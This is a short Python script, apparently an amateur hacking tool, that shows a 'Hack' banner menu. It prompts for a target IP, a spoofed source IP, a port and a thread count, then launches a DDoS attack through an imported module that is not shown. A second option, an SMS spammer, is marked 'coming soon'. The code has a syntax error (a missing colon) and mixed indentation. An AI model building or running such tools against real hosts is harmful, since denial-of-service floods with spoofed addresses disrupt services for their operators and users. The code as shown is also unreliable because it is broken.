import pyfiglet
import ddos.main as ddos

def load():
	print(pyfiglet.figlet_format("Hack"))
	print("[1] DDoS attack")
	print("[2] SMS Spamer")
	result = input("[*] Enter a number: ")
	if result == '1':
		input1 = input("Enter the target ip: ")
		input2 = input("Enter a fake ip: ")
		input3 = input("Enter the port of target: ")
		input4 = input("Enter the number of threads: ")
		ddosClass = ddos.DDoS(input4, input1, input2, input3)
		ddosClass.attack()
		load()
	if result == '2'
    	print('Coming soon!!')
load()
